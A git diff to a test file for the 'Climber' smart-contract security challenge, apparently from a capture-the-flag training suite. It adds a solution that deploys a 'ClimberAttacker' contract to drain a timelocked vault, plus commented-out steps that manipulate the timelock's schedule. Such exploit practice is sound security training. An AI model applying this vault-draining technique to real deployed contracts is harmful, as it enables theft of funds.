@@ -58,6 +58,13 @@ describe('[Challenge] Climber', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const attackerContract = await (
+            await ethers.getContractFactory("ClimberAttacker", deployer)
+        )
+            .connect(player)
+            .deploy(vault.address, timelock.address, token.address);
+
+        await attackerContract.connect(player).attack();
     });
 
     after(async function () {
@@ -66,3 +73,29 @@ describe('[Challenge] Climber', function () {
         expect(await token.balanceOf(player.address)).to.eq(VAULT_TOKEN_BALANCE);
     });
 });
+
+// For tests
+// it("Execution", async function () {
+//     /** CODE YOUR SOLUTION HERE */
+//     let dataElements = [];
+//     dataElements[0] = iface.encodeFunctionData("updateDelay", [1]);
+
+//     const saltStr = ethers.utils.formatBytes32String("123");
+
+//     await timelock
+//         .connect(proposer)
+//         .schedule([timelock.address], [0], dataElements, saltStr);
+
+//     await network.provider.request({
+//         method: "evm_increaseTime",
+//         params: [70 * 70],
+//     });
+
+//     await timelock
+//         .connect(player)
+//         .execute([timelock.address], [0], dataElements, saltStr);
+// });
+
+// after(async function () {
+//     expect(await timelock.delay()).to.eq(1);
+// });
